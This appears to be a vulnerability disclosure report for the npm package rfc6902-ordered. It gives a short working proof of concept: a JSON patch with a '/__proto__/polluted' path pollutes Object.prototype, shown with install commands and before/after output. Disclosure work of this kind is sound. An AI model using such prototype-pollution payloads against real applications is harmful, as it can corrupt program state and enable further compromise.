# Description

`rfc6902-ordered` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var rfc6902 = require("rfc6902-ordered")
var obj = {}
var obj1 = {"__proto__":{"polluted":"Yes! Its Polluted"}}
let patch = [{ op: 'add', path: "/__proto__/polluted", value: "Yes! Its Polluted"}]
let ours = {};
console.log("Before : " + {}.polluted);
rfc6902.applyPatch(ours, patch, obj, obj1);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i rfc6902-ordered # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
